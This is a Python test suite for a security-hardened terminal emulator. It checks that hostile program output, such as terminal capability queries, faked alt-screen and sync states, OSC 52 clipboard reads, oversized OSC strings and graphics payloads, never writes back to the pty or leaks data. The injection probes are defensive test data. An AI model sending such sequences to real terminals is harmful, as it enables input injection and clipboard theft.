# --- synchronized output (DECSET 2026): hold the paint between begin/end ------
_sy = SecureTerminal(command='/bin/cat', tui=True)
_sy._make_screen()
_sy._render_timer.stop()
feed_output(_sy, b'\x1b[?2026h')
ok(_sy._sync_update and not _sy._render_timer.isActive(),
   'DECSET 2026 begin holds the paint (pyte still fed)')
feed_output(_sy, b'half a frame')
ok(_sy._sync_update and not _sy._render_timer.isActive(),
   'the paint stays held during a synchronized update')
feed_output(_sy, b'\x1b[?2026l')
ok(not _sy._sync_update, 'DECSET 2026 end releases the hold')
feed_output(_sy, b'\x1b[?2026h')
_sy._end_sync_update()                     # simulate the watchdog firing
ok(not _sy._sync_update, 'an unclosed synchronized update is bounded (watchdog)')
_sy.close()

# a pending 16ms paint is cancelled when a synchronized update begins (no partial)
_sy2 = SecureTerminal(command='/bin/cat', tui=True)
_sy2._make_screen()
_sy2._render_timer.start(16)               # arm a pending paint
feed_output(_sy2, b'\x1b[?2026h')
ok(_sy2._sync_update and not _sy2._render_timer.isActive(),
   'entering a synchronized update cancels a pending partial paint')
# a ?2026 marker split across two reads is still detected (boundary carry)
_sy2._end_sync_update()
feed_output(_sy2, b'\x1b[?202')            # first half of the begin marker
feed_output(_sy2, b'6h')                   # second half in the next read
ok(_sy2._sync_update, 'a ?2026h begin split across reads is still detected')
feed_output(_sy2, b'\x1b[?2026l')
ok(not _sy2._sync_update, 'and the matching end too')
# a repeated begin while already held must NOT re-arm the watchdog (no indefinite hold)
_starts = []
_sy2._sync_timer.start = lambda *a: _starts.append(1)   # count re-arms
feed_output(_sy2, b'\x1b[?2026h')          # enter -> arm once
feed_output(_sy2, b'\x1b[?2026h')          # repeat while held -> must not re-arm
eq(len(_starts), 1, 'a repeated ?2026h while held does not re-arm the watchdog')
# but an END-then-BEGIN in one read is a NEW frame -> the watchdog IS restarted
feed_output(_sy2, b'\x1b[?2026l\x1b[?2026h')
eq(len(_starts), 2, 'an end-then-begin in one read restarts the watchdog (new frame)')
_sy2.close()

# There is no gated OSC colour-query write-back: no terminal-side signal
# (alt-screen, ICANON) reliably distinguishes a legit query consumer from injection
# at a shell prompt -- a background job or a cat'd file emitting ?1049h defeats any
# such gate. The absolute "output never writes to the pty" closure holds instead;
# every query, colour included, stays unanswered (see the reflection oracle below).

# --- OSC 52 clipboard READ: opt-in, ask-once-per-tab, the ONE write-back -------
from PyQt6.QtGui import QGuiApplication as _QGA                     # noqa: E402
_QGA.clipboard().setText('clip-secret')


def _clip_read(feature_on, grant):
    c = SecureTerminal(command='/bin/cat', tui=True)
    c.apply_osc('osc_clipboard_read', feature_on)
    _reqs = []
    c.clipboard_read_requested.connect(lambda: _reqs.append(1))
    _sent: list[bytes] = []
    c._write = _sent.append                # pylint: disable=protected-access
    if grant is not None:
        # A tab that ALREADY carries a persistent decision (allow-always / deny-always)
        # from an earlier dialog: a later read reads _clipboard_read directly, it does
        # not reopen a dialog. grant_clipboard_read ONLY resolves a live 'pending' dialog
        # (a late click on an abandoned one is dropped), so model the standing decision
        # as the persisted state, not a fresh grant.
        c._clipboard_read = bool(grant)
    c._handle_osc(b'\x1b]52;c;?\x07')
    c.close()
    return _reqs, _sent


_rq, _st = _clip_read(False, None)
eq(_st, [], 'OSC 52 read: feature off -> no reply')
eq(len(_rq), 0, 'OSC 52 read: feature off -> no dialog asked')
_rq, _st = _clip_read(True, None)
eq(_st, [], 'OSC 52 read: enabled but tab undecided -> NO reply (only asks once)')
eq(len(_rq), 1, 'OSC 52 read: enabled + undecided -> the ask-once-per-tab dialog is raised')
_rq, _st = _clip_read(True, False)
eq(_st, [], 'OSC 52 read: tab denied -> no reply, no re-ask')
eq(len(_rq), 0, 'OSC 52 read: a denied tab is not re-asked')
_rq, _st = _clip_read(True, True)
ok(len(_st) == 1 and _st[0].startswith(b'\x1b]52;c;'),
   'OSC 52 read: enabled + tab granted -> the clipboard is answered')
import base64 as _b64                                              # noqa: E402
eq(_b64.b64decode(_st[0].split(b';', 2)[2].rstrip(b'\x07')), b'clip-secret',
   'OSC 52 read: the reply carries the clipboard, base64-encoded')
# base64-ONLY: the reply body carries no newline or control byte, so a granted read
# cannot smuggle an injection onto the program's stdin.
import re as _re_clip                                              # noqa: E402
_clipbody = _st[0].split(b';', 2)[2].rstrip(b'\x07')
ok(_re_clip.fullmatch(rb'[A-Za-z0-9+/]*={0,2}', _clipbody) is not None,
   'OSC 52 read: the reply body is base64-only (no control/newline reaches stdin)')
# SIZE-CAPPED: an oversized clipboard is truncated to _OSC_CLIP_MAX before encoding,
# so a granted program cannot pull an unbounded read off the clipboard.
from secure_terminal.terminal import _OSC_CLIP_MAX as _CLIPMAX    # noqa: E402
_QGA.clipboard().setText('A' * (_CLIPMAX + 5000))
_rqc, _stc = _clip_read(True, True)
ok(len(_stc) == 1, 'OSC 52 read: an oversized clipboard still yields exactly one reply')
eq(len(_b64.b64decode(_stc[0].split(b';', 2)[2].rstrip(b'\x07'))), _CLIPMAX,
   'OSC 52 read: the clipboard reply is size-capped at _OSC_CLIP_MAX')
_QGA.clipboard().setText('clip-secret')       # restore for later readers
# rate-limited: a granted tab cannot be flood-exfiltrated
_cg = SecureTerminal(command='/bin/cat', tui=True)
_cg.apply_osc('osc_clipboard_read', True)
_cg._clipboard_read = True                 # a tab already granted allow-always
_cgs: list[bytes] = []
_cg._write = _cgs.append
_cg._handle_osc(b'\x1b]52;c;?\x07')
_cg._handle_osc(b'\x1b]52;c;?\x07')
eq(len(_cgs), 1, 'OSC 52 read: two reads in a granted tab -> one reply (rate-limited)')
_cg.close()
# granting a PENDING request answers the query that opened the dialog (codex F1)
_cpr = SecureTerminal(command='/bin/cat', tui=True)
_cpr.apply_osc('osc_clipboard_read', True)
_cps: list[bytes] = []
_cpr._write = _cps.append
_cpr._handle_osc(b'\x1b]52;c;?\x07')        # -> pending, dialog asked, no reply yet
eq(_cps, [], 'a pending clipboard request sends no reply until the user decides')
_cpr.grant_clipboard_read(_cpr.CLIP_ALLOW_ALWAYS)  # user allows -> the pending query is answered NOW
ok(len(_cps) == 1 and _cps[0].startswith(b'\x1b]52;c;'),
   'granting a pending request answers the query that opened the dialog')
_cpr.close()

# --- OSC 52 read: the four dialog decisions (allow/deny x once/always) ---------
def _clip_term():
    c = SecureTerminal(command='/bin/cat', tui=True)
    c.apply_osc('osc_clipboard_read', True)
    reqs: list[int] = []
    sent: list[bytes] = []
    c.clipboard_read_requested.connect(lambda: reqs.append(1))
    c._write = sent.append                 # pylint: disable=protected-access
    return c, reqs, sent


def _clip_ask(c):
    c._last_clip_read = 0.0                 # clear the rate-limit gate for the test
    c._handle_osc(b'\x1b]52;c;?\x07')

# allow-once: answers THIS request, but does NOT remember -> the next read re-asks
_co, _cor, _cos = _clip_term()
_clip_ask(_co)
_co.grant_clipboard_read(_co.CLIP_ALLOW_ONCE)
eq(len(_cos), 1, 'OSC 52 read: allow-once answers the pending request')
_clip_ask(_co)
eq(len(_cor), 2, 'OSC 52 read: allow-once does not remember -> the next read re-asks')
_co.close()

# allow-always: answers and remembers -> the next read replies with no new dialog
_ca, _car, _cas = _clip_term()
_clip_ask(_ca)
_ca.grant_clipboard_read(_ca.CLIP_ALLOW_ALWAYS)
_clip_ask(_ca)
eq(len(_car), 1, 'OSC 52 read: allow-always is remembered -> no second dialog')
eq(len(_cas), 2, 'OSC 52 read: allow-always answers subsequent reads directly')
_ca.close()

# deny-once: no reply, and the next read re-asks
_do, _dor, _dos = _clip_term()
_clip_ask(_do)
_do.grant_clipboard_read(_do.CLIP_DENY_ONCE)
eq(_dos, [], 'OSC 52 read: deny-once sends no reply')
_clip_ask(_do)
eq(len(_dor), 2, 'OSC 52 read: deny-once does not remember -> the next read re-asks')
_do.close()

# deny-always: no reply, no re-ask
_da, _dar, _das = _clip_term()
_clip_ask(_da)
_da.grant_clipboard_read(_da.CLIP_DENY_ALWAYS)
_clip_ask(_da)
eq(_das, [], 'OSC 52 read: deny-always sends no reply')
eq(len(_dar), 1, 'OSC 52 read: deny-always is remembered -> no re-ask')
_da.close()

# global always-allow: an undecided tab auto-answers with NO dialog...
_ga, _gar, _gas = _clip_term()
_ga.set_clipboard_read_always(True)
_clip_ask(_ga)
eq(len(_gar), 0, 'OSC 52 read: global always-allow answers WITHOUT a dialog')
ok(len(_gas) == 1 and _gas[0].startswith(b'\x1b]52;c;'),
   'OSC 52 read: global always-allow replies to an undecided tab')
# ...but an explicit per-tab Deny still wins over the global default. Global always-allow
# answers with NO dialog, so no 'pending' is ever raised for grant to resolve -- the
# standing per-tab deny is the persisted state (False), read directly.
_ga._clipboard_read = False
_gas.clear()
_clip_ask(_ga)
eq(_gas, [], 'OSC 52 read: a per-tab Deny wins over global always-allow')
_ga.close()
# CLI-mode notice distinguishes an OSC 52 READ query from a WRITE (shared code 52)
_cn = SecureTerminal(command='/bin/cat')   # CLI mode
_nk = []
_cn.osc_used.connect(lambda k: _nk.append(k))
feed_output(_cn, b'\x1b]52;c;?\x07')       # read query
ok('osc_clipboard_read' in _nk, 'CLI OSC 52 read query is notified as clipboard_read')
_nk.clear()
feed_output(_cn, b'\x1b]52;c;aGk=\x07')    # write
ok('osc_clipboard' in _nk and 'osc_clipboard_read' not in _nk,
   'CLI OSC 52 write is notified as clipboard (write), not read')
_cn.close()

# --- reflection oracle: output must NEVER cause a write to the pty ------------
# The crown-jewel invariant. A crafted file cat'd to the terminal, or hostile
# program output, can emit a capability QUERY (DA/DSR/CPR/XTVERSION/DECRQM/
# XTGETTCAP/DECRQSS/kitty-?u/OSC color+clipboard read/ENQ). A terminal that
# ANSWERS reflects the reply into the foreground program's stdin -- a 20-year
# "output becomes input" injection class. secure-terminal answers NONE of them,
# in either mode, because nothing on the output path writes to the pty. Feed the
# whole battery through the real _on_readable and assert the write-spy stays empty.
def _spec_surface_corpus():
    """The reflection/query spec surface expanded to its real breadth: every
    DISTINCT sequence a terminal could be asked to REPLY to (each a documented
    query, not padding). Covers DA1/DA2/DA3 + DECID, DSR (ANSI + DEC-private),
    DECRQM for the documented ANSI and DEC-private modes, OSC dynamic-colour
    queries for all 256 palette indices + the special colour slots, OSC 52
    clipboard READ per selection, XTGETTCAP for the standard terminfo cap set,
    DECRQSS status-string requests, XTWINOPS report requests, XTVERSION, the kitty
    keyboard query and ENQ. secure-terminal answers NONE of them in either mode."""
    seq = []
    seq += [b'\x1b[c', b'\x1b[0c', b'\x1b[>c', b'\x1b[>0c', b'\x1b[=c',
            b'\x1b[=0c', b'\x1bZ']              # DA1/DA2/DA3 + DECID
    for _n in (5, 6, 15, 25, 26, 53, 55, 56, 62, 63, 75, 85):
        seq.append(b'\x1b[%dn' % _n)           # DSR (ANSI)
        seq.append(b'\x1b[?%dn' % _n)          # DSR (DEC-private)
    for _m in (2, 4, 12, 20):
        seq.append(b'\x1b[%d$p' % _m)          # DECRQM (ANSI modes)
    for _m in (1, 3, 5, 6, 7, 8, 9, 12, 25, 45, 47, 66, 67, 69, 1000, 1001,
               1002, 1003, 1004, 1005, 1006, 1007, 1015, 1016, 1034, 1047,
               1048, 1049, 2004, 2026, 2027, 2031, 9001):
        seq.append(b'\x1b[?%d$p' % _m)         # DECRQM (DEC-private modes)
    for _n in range(256):
        seq.append(b'\x1b]4;%d;?\x07' % _n)    # OSC 4 palette query, every index
    for _n in range(10, 20):
        seq.append(b'\x1b]%d;?\x07' % _n)      # OSC 10-19 special colour slots
    for _sel in (b'c', b'p', b's', b'0', b'7'):
        seq.append(b'\x1b]52;' + _sel + b';?\x07')   # OSC 52 clipboard READ
    for _cap in ('Co', 'RGB', 'TN', 'name', 'bce', 'colors', 'cr', 'kbs', 'kDC',
                 'kEND', 'kHOM', 'kLFT', 'kNXT', 'kPRV', 'kRIT', 'khome', 'kend',
                 'smcup', 'rmcup', 'smkx', 'rmkx', 'Se', 'Ss', 'Cr', 'Cs', 'u6',
                 'u7', 'u8', 'u9'):
        seq.append(b'\x1bP+q' + _cap.encode().hex().encode() + b'\x1b\\')  # XTGETTCAP
    for _s in (b'm', b'r', b's', b'"q', b'"p', b' q', b't', b'$}', b'$~'):
        seq.append(b'\x1bP$q' + _s + b'\x1b\\')      # DECRQSS status-string request
    for _t in (11, 13, 14, 18, 19, 20, 21):
        seq.append(b'\x1b[%dt' % _t)           # XTWINOPS size/position/title reports
    seq += [b'\x1b[>q', b'\x1b[?u', b'\x05']    # XTVERSION, kitty query, ENQ
    return list(dict.fromkeys(seq))            # distinct, order-preserving


_QUERIES = _spec_surface_corpus()


for _label, _mk in (('CLI', lambda: SecureTerminal(command='/bin/cat')),
                    ('TUI', lambda: SecureTerminal(command='/bin/cat', tui=True))):
    _ro = _mk()
    if _label == 'TUI':
        for _k in (f[0] for f in _S.OSC_FEATURES):
            _ro.apply_osc(_k, True)        # even every OSC feature ENABLED must not reply
    _rosent = spy_writes(_ro)
    for _q in _QUERIES:
        feed_output(_ro, _q)
    ok(_rosent == [],
       'reflection oracle (%s): none of the %d spec-surface queries is answered '
       'back to the pty (got %r)' % (_label, len(_QUERIES), _rosent))
    if _label == 'CLI':
        ok(_ro._screen is None,           # pylint: disable=protected-access
           'reflection oracle (CLI): the pyte screen is never instantiated '
           '(no VT state to attack)')
    # Even if pyte itself tried to reply, our screen never wires the channel:
    if _ro._screen is not None:            # pylint: disable=protected-access
        _ro._screen.write_process_input('should-go-nowhere')
        ok(_rosent == [], 'reflection oracle (%s): pyte write_process_input reaches no pty'
           % _label)
    _ro.close()

# lock the corpus size so the "N spec-surface sequences" figure on the site and the
# test cannot silently drift apart (compatibility + ai-review pages cite this count)
ok(len(_QUERIES) == 387,
   'the reflection spec-surface corpus is 387 distinct query sequences (got %d)'
   % len(_QUERIES))

# --- graphics payloads (sixel DCS, kitty APC, iTerm2 1337): stripped, no reply -
# a cat'd image is a huge DCS/APC/OSC string; CLI shows no image and answers nothing
_gfx = SecureTerminal(command='/bin/cat')
_gfxsent = spy_writes(_gfx)
feed_output(_gfx, b'before\x1bP0;0;0q#0;2;0;0;0#0~~@@vv@@~~$-#1?}}GG}}?-\x1b\\after\n')
feed_output(_gfx, b'k\x1b_Gf=32,s=1,v=1,c=1,r=1;AAAA\x1b\\g\n')   # kitty graphics
feed_output(_gfx, b'i\x1b]1337;File=inline=1:AAAA\x07j\n')        # iTerm2 inline image
_gfxdoc = _gfx.toPlainText()
ok('\x1b' not in _gfxdoc, 'graphics payloads leave no escape byte in the document')
ok('before' in _gfxdoc and 'after' in _gfxdoc,
   'text around a sixel image survives; the image DCS body is dropped')
ok('#0;2' not in _gfxdoc and 'Gf=32' not in _gfxdoc and 'File=inline' not in _gfxdoc,
   'no sixel/kitty/iTerm2 image data is rendered as text')
ok(_gfxsent == [], 'a graphics payload triggers no reply to the pty')
_gfx.close()

# --- mouse-reporting oracle: OUTPUT never fabricates input; only real user events ---
# secure-terminal now IMPLEMENTS mouse reporting (konsole/xterm parity -- see the
# parity block above), so unlike its earlier stance it DOES answer real mouse/focus
# events with ESC[<...M/m reports when the program asked for them. The security
# property that REMAINS -- and the one this oracle guards -- is that a program's
# OUTPUT cannot itself cause a write: enabling every mouse mode writes nothing back,
# and Shift keeps a real event LOCAL. This is the updated terminal-poc-corpus
# 'mouse-tracking-reflection' expectation for this terminal (reporting is a feature;
# the invariant is output-cannot-inject).
from PyQt6.QtGui import QFocusEvent as _QFE            # noqa: E402
_mf = SecureTerminal(command='/bin/cat', tui=True)
_mfsent = spy_writes(_mf)
# Output that enables EVERY mouse mode + the alt screen writes NOTHING back by itself.
feed_output(_mf, b'\x1b[?1000h\x1b[?1002h\x1b[?1003h\x1b[?1006h\x1b[?1004h\x1b[?1049h')
ok(_mfsent == [], 'enabling mouse modes from OUTPUT writes nothing back (no reflection)')
_mflb = Qt.MouseButton.LeftButton
_mfnb = Qt.MouseButton.NoButton
_mfnm = Qt.KeyboardModifier.NoModifier
_mfsh = Qt.KeyboardModifier.ShiftModifier
# A real user press IS reported now (the feature).
_mf.mousePressEvent(QMouseEvent(QEvent.Type.MouseButtonPress, QPointF(9, 9),
                                QPointF(9, 9), _mflb, _mflb, _mfnm))
ok(_mfsent and _mfsent[-1].startswith(b'\x1b[<') and _mfsent[-1].endswith(b'M'),
   'a real user press IS reported to the child (mouse-reporting parity)')
_mf.mouseReleaseEvent(QMouseEvent(QEvent.Type.MouseButtonRelease, QPointF(9, 9),
                                  QPointF(9, 9), _mflb, _mfnb, _mfnm))
# Shift keeps a real event LOCAL -- the override holds, no report reaches the child.
_mfsent.clear()
_mf.mousePressEvent(QMouseEvent(QEvent.Type.MouseButtonPress, QPointF(9, 9),
                                QPointF(9, 9), _mflb, _mflb, _mfsh))
ok(_mfsent == [], 'Shift+press stays local -- no report (the local override holds)')
_mf.mouseReleaseEvent(QMouseEvent(QEvent.Type.MouseButtonRelease, QPointF(9, 9),
                                  QPointF(9, 9), _mflb, _mfnb, _mfsh))
# POSITIVE CONTROL: the spy is wired to the one choke point (_write); a synthetic
# report pushed through it MUST be caught, proving the observations above are real.
_mfsent.clear()
_mf._write(b'\x1b[<0;12;6M')                          # pylint: disable=protected-access
ok(_mfsent == [b'\x1b[<0;12;6M'],
   'positive control: a report through _write is observed (the spy is live)')
_mf.close()

# --- synchronized-output DoS: a never-closed ESC[?2026h must self-release -------
# A program that opens a synchronized update (DECSET private mode 2026) and never
# sends the closing ESC[?2026l would freeze the display forever if the terminal
# held the frame unconditionally. secure-terminal bounds the hold with a 150ms
# watchdog: the frame is painted even when the close never arrives, so output-driven
# DoS cannot wedge the widget. This is the WIDGET-level observable -- the corpus
# denial-of-service oracle measures the Qt-free render() path only, never the
# sync-update hold, which is a live-widget timer.
_sy = SecureTerminal(command='/bin/cat', tui=True)
feed_output(_sy, b'\x1b[?2026h')                 # open a sync update, never close it
feed_output(_sy, b'held-frame-content\n')        # painted only when the hold releases
ok(_sy._sync_update, 'ESC[?2026h opens a synchronized-update hold')      # noqa: protected-access
pump(230)                                        # > the 150ms watchdog bound
ok(not _sy._sync_update,
   'a never-closed synchronized update self-releases within the 150ms watchdog '
   '(no output-driven display freeze)')
ok('held-frame-content' in _sy.toPlainText(),
   'the held frame is painted once the sync watchdog fires')
_sy.close()

# ADVERSARIAL reflection oracle: a hostile file/program does not just emit a
# query -- it can ALSO emit output that tries to OPEN a reply first (fake the
# alternate screen with ESC[?1049h, begin a synchronized update), and the shell
# may be at a readline prompt (pty non-canonical, ICANON off). NONE of these
# output-induced states, alone or combined, may open ANY write-back. This is the
# property that would have caught the alt-screen and raw-mode gate defeats before
# external review: feed every query PREFIXED with each state-faking sequence and
# assert the write-spy stays empty.
import termios as _tio_adv                                         # noqa: E402
_ADV_PREFIXES = [b'', b'\x1b[?1049h', b'\x1b[?1047h', b'\x1b[?47h', b'\x1b[?2026h',
                 b'\x1b[?1049h\x1b[?2026h']
_advx = SecureTerminal(command='/bin/cat', tui=True)
for _k in (f[0] for f in _S.OSC_FEATURES):
    _advx.apply_osc(_k, True)              # every OSC feature enabled
_aa = _tio_adv.tcgetattr(_advx._fd)        # + the readline-prompt case (ICANON off)
_aa[3] &= ~_tio_adv.ICANON
_tio_adv.tcsetattr(_advx._fd, _tio_adv.TCSANOW, _aa)
_advsent = spy_writes(_advx)
for _pfx in _ADV_PREFIXES:
    for _q in _QUERIES:
        feed_output(_advx, _pfx + _q)
ok(_advsent == [],
   'reflection oracle (adversarial): output that fakes alt-screen / sync while at '
   'a readline prompt still elicits ZERO write-back (got %r)' % _advsent[:3])
_advx.close()

# --- bell (BEL) policy --------------------------------------------------------
# A standalone BEL in output rings per the tab's policy (off/audible/visual),
# off by default (BEL from untrusted output is a nuisance surface), and is
# rate-limited so a BEL flood cannot machine-gun it. An OSC-terminating BEL is
# not a bell. The BEL itself stays neutralized in the display either way.
import secure_terminal.terminal as _stmod    # noqa: E402


class _FakeApp:
    def __init__(self):
        self.beeps = 0
        self.alerts = 0

    def beep(self):
        self.beeps += 1

    def alert(self, _win, _msec):
        self.alerts += 1

    def cursorFlashTime(self):               # noqa: N802 (Qt API name)
        return 1000                          # so a cursor blink under the shim works


class _QAppShim:
    _fake = _FakeApp()

    @staticmethod
    def instance():
        return _QAppShim._fake

    @staticmethod
    def styleHints():
        # The blink-cursor code reads QApplication.styleHints().cursorFlashTime();
        # keep the shim complete so replacing QApplication cannot AttributeError.
        return _QAppShim._fake


_be = SecureTerminal(command='/bin/cat')
eq(_be.bell_channels(), set(), 'bell defaults to silent (no channels)')
_be.apply_bell('audible')
eq(_be.bell_channels(), {'audible'}, 'apply_bell enables a channel')
_be.apply_bell('audible,visual,tray')
eq(_be.bell_channels(), {'audible', 'visual', 'tray'}, 'channels are non-exclusive')
_be.apply_bell({'visual'})                         # a set spec is accepted too
eq(_be.bell_channels(), {'visual'}, 'apply_bell accepts a set')
_be.apply_bell('bogus,off')
eq(_be.bell_channels(), set(), 'unknown/legacy-off tokens yield no channels')

_orig_qapp = _stmod.QApplication
_stmod.QApplication = _QAppShim
try:
    fake = _QAppShim._fake
    _be.apply_bell('audible')
    feed_output(_be, b'ding\x07more\x07')          # two BELs in one burst
    eq(fake.beeps, 1, 'a BEL burst rings once (rate-limited)')
    fake.beeps = 0
    feed_output(_be, b'\x1b]0;a title\x07')        # OSC terminator, not a bell
    eq(fake.beeps, 0, 'an OSC-terminating BEL does not ring')
    _be.apply_bell('off')
    feed_output(_be, b'x\x07y')
    eq(fake.beeps, 0, 'silent bell does not ring')
    _be.apply_bell('visual')
    _be._last_bell = 0.0                           # clear the rate-limit gate
    feed_output(_be, b'attn\x07')
    eq(fake.alerts, 1, 'visual channel raises a window urgency alert')
    # non-exclusive: audible + visual together fire BOTH on one bell
    fake.beeps = 0
    fake.alerts = 0
    _be.apply_bell('audible,visual')
    _be._last_bell = 0.0
    feed_output(_be, b'both\x07')
    eq((fake.beeps, fake.alerts), (1, 1), 'audible+visual both fire on one bell')
    # tray channel emits the bell_tray signal (the window shows the popup)
    _trays = []
    _be.bell_tray.connect(lambda label: _trays.append(label))
    _be.apply_bell('tray')
    _be._last_bell = 0.0
    feed_output(_be, b'ping\x07')
    eq(len(_trays), 1, 'tray channel emits a bell_tray notification')
    # a shell OSC title (BEL-terminated) split across two reads must NOT false-ring:
    # the BEL is the OSC terminator, consumed by the carry, not a standalone bell
    fake.beeps = 0
    _be.apply_bell('audible')
    _be._last_bell = 0.0
    feed_output(_be, b'\x1b]0;host: ~/dir')        # OSC title, no terminator yet
    feed_output(_be, b'\x07$ ')                    # its BEL terminator next read
    eq(fake.beeps, 0, 'a shell OSC title split across reads does not false-ring the bell')
finally:
    _stmod.QApplication = _orig_qapp
_be.close()

# bell sound file is accepted only inside an allowed folder (AppArmor-enforceable)
from secure_terminal.terminal import sound_file_allowed as _sfa, BELL_SOUND_DIRS as _bsd  # noqa: E402
ok(not _sfa('/etc/passwd'), 'a sound file outside the allowed folders is rejected')
ok(not _sfa(''), 'an empty sound path is rejected')
_sound_ok = None
for _d in _bsd:
    if os.path.isdir(_d):
        for _root, _dirs, _files in os.walk(_d):
            _snd = [f for f in _files if f.endswith(('.wav', '.ogg', '.oga'))]
            if _snd:
                _sound_ok = os.path.join(_root, _snd[0])
                break
    if _sound_ok:
        break
if _sound_ok:
    ok(_sfa(_sound_ok), 'a sound file inside an allowed folder is accepted (%s)' % _sound_ok)

# a malformed persisted bell spec (corrupt session) never raises -> no channels
eq(SecureTerminal._parse_bell(123), set(), 'a non-iterable bell spec yields no channels')
eq(SecureTerminal._parse_bell([None, 'audible', 5]), {'audible'},
   'a list with non-string elements is filtered, not fatal')
eq(SecureTerminal._parse_bell({'visual', 'nope'}), {'visual'},
   'an unknown channel in a set is dropped')

# toggling one channel preserves the current tab's OTHER channels (codex F2)
_btw = SecureTerminal(command='/bin/cat')
win.tabs.addTab(_btw, 'bell-preserve')
win.tabs.setCurrentWidget(_btw)
_btw.apply_bell({'visual'})
win._default_bell = set()                         # make the tab differ from default
win.set_bell_channel('tray', True)
eq(_btw.bell_channels(), {'visual', 'tray'},
   'toggling one channel keeps the current tab other channels')
eq(win._default_bell, {'tray'}, 'the global default tracks the toggled channel')
win.tabs.removeTab(win.tabs.indexOf(_btw))
_btw.close()

# a bell_sound admin lock refuses the sound setter
_saved_l2 = win._locked
win._locked = set(win._locked) | {'bell_sound'}
win._default_bell_sound = ''
win.set_bell_sound('/usr/share/sounds/anything.wav')
eq(win._default_bell_sound, '', 'a bell_sound lock refuses set_bell_sound')
win._locked = _saved_l2

# switching modes clears a pending CLI discard state, or output after the switch
# back would be swallowed until a stray terminator (codex F2)
if tui_available():
    _bd = SecureTerminal(command='/bin/cat')
    _bd._esc_drop = 'P'
    _bd._esc_dropped = 1234
    _bd._esc_notified = True
    _bd.apply_tui(True)
    eq((_bd._esc_drop, _bd._esc_dropped, _bd._esc_notified), ('', 0, False),
       'switching to TUI clears a pending CLI discard state, its counter and its notice flag')
    _bd.close()

# an over-cap OSC (introducer truncated by the discard) still surfaces an OSC-use
# notice, so padding an OSC past the cap cannot evade the once-per-type banner (F5)
_bo = SecureTerminal(command='/bin/cat')
_osc_seen = []
_bo.osc_used.connect(lambda k: _osc_seen.append(k))
feed_output(_bo, b'\x1b]0;' + b'A' * 5000)         # >cap OSC, no terminator -> discard
ok('osc_other' in _osc_seen, 'an over-cap OSC still surfaces an OSC-use notice')
_bo.close()

# escape_limit: an unterminated OSC/DCS string sequence makes CLI mode discard all
# following output (safe -- no escape byte is ever rendered) but it looks like a
# freeze. The suppression is NEVER lifted; instead a one-time notice fires past the
# threshold. Pure function first (the discard keeps suppressing + counts), then the
# live widget's escape_suppressed signal.
from secure_terminal.sanitize import feed_chunk_carry           # noqa: E402
_ES = '\x1b]' + 'A' * 5000                          # over-cap incomplete OSC (no BEL/ST)
# entering the discard state records the characters suppressed so far
eq(feed_chunk_carry(_ES, '', '', 0), ('', '', ']', len(_ES)),
   'feed_chunk_carry: an over-cap incomplete OSC enters the discard state, counting suppressed chars')
# the discard keeps suppressing across chunks; the counter accumulates (never resumes)
eq(feed_chunk_carry('B' * 100, '', ']', len(_ES)), ('', '', ']', len(_ES) + 100),
   'feed_chunk_carry: the discard keeps suppressing and accumulating, never rendering the bytes')
# a real terminator ends the sequence, resets the counter, and renders the tail after it
eq(feed_chunk_carry('done\x07after', '', ']', len(_ES)), ('after', '', '', 0),
   'feed_chunk_carry: a terminator ends the sequence and resets the discard counter')
# a lone trailing ESC in the discard state is held as a possible split ST terminator
eq(feed_chunk_carry('data\x1b', '', 'P', 10), ('', '\x1b', 'P', 15),
   'feed_chunk_carry: a trailing ESC is carried as a possible split ST')

# live widget: the escape_suppressed signal fires ONCE past the threshold; the
# output stays suppressed (nothing is rendered) either way.
_eln = SecureTerminal(command='/bin/cat', tui=False)
_eln.apply_escape_limit(4096)
_fired = []
_eln.escape_suppressed.connect(lambda: _fired.append(1))
feed_output(_eln, b'\x1b]0;' + b'A' * 5000)         # over-cap unterminated OSC -> past the threshold
eq(len(_fired), 1, 'escape_suppressed fires once when suppression passes the threshold')
feed_output(_eln, b'B' * 5000)                      # still no terminator, same run
eq(len(_fired), 1, 'escape_suppressed does not re-fire within one discard run')
ok('AAAA' not in _eln.transcript_text() and 'BBBB' not in _eln.transcript_text(),
   'the suppressed output is never rendered (no escape byte leaks as text)')
feed_output(_eln, b'\x07')                          # terminator ends the sequence (re-arm)
feed_output(_eln, b'\x1b]0;' + b'C' * 5000)         # a NEW unterminated sequence re-fires
eq(len(_fired), 2, 'escape_suppressed re-arms and re-fires after the sequence ends')
_eln.close()
# escape_limit=0 never notifies, but still suppresses; a negative clamps to 0.
_el0 = SecureTerminal(command='/bin/cat', tui=False)
_el0.apply_escape_limit(-5)
eq(_el0.current_escape_limit(), 0, 'apply_escape_limit clamps a negative threshold to 0')
_fired0 = []
_el0.escape_suppressed.connect(lambda: _fired0.append(1))
feed_output(_el0, b'\x1b]0;' + b'A' * 5000)
feed_output(_el0, b'B' * 5000)
eq(len(_fired0), 0, 'escape_limit=0: never notifies')
ok('BBBB' not in _el0.transcript_text(), 'escape_limit=0 still suppresses the output')
_el0.close()

# --- system tray: opt-in, default off, no untrusted output on the tray --------
# Offscreen has no real tray, so exercise the gating/persist logic and the
# deception-safe notification text directly (injecting a fake tray object).
eq(win._systray, False, 'systray is opt-in: default off')
eq(win.act_systray.isChecked(), False, 'systray menu action reflects the default (off)')
ok(not win._bell_actions['tray'].isEnabled(),
   "the 'Tray popup' bell channel is greyed out while the tray is off")

# Offscreen has NO system tray, so enabling must fail closed: revert to off and
# leave the 'tray' bell channel greyed, never present the feature as active.
win._tray = None
win.set_systray(True)
ok(not win._systray and not win.act_systray.isChecked(),
   'set_systray(True) reverts when no system tray is available')
ok(not win._bell_actions['tray'].isEnabled(),
   'the tray bell channel stays greyed when no tray is available')


class _FakeTray:                                       # captures showMessage bodies
    def __init__(self):
        self.bodies = []

    def showMessage(self, _title, body, *_a):
        self.bodies.append(body)

    def hide(self):
        pass

# With a tray available (faked), enabling really enables and un-greys the channel.
from PyQt6.QtWidgets import QSystemTrayIcon as _QSTI                # noqa: E402
_orig_avail = _QSTI.isSystemTrayAvailable
_QSTI.isSystemTrayAvailable = staticmethod(lambda: True)
try:
    win._tray = _FakeTray()          # so _tray_icon() returns it, no real construction
    win.set_systray(True)
    ok(win._systray and win.act_systray.isChecked(),
       'set_systray(True) enables the tray when one is available')
    ok(win._bell_actions['tray'].isEnabled(),
       "enabling the tray un-greys the 'Tray popup' bell channel")
    win.set_systray(False)
    ok(not win._systray and not win._bell_actions['tray'].isEnabled(),
       'set_systray(False) disables the tray and re-greys the bell channel')

    # admin lock: a locked systray key makes the toggle a no-op
    _saved_locked = win._locked
    win._locked = frozenset({'systray'})
    win.set_systray(True)
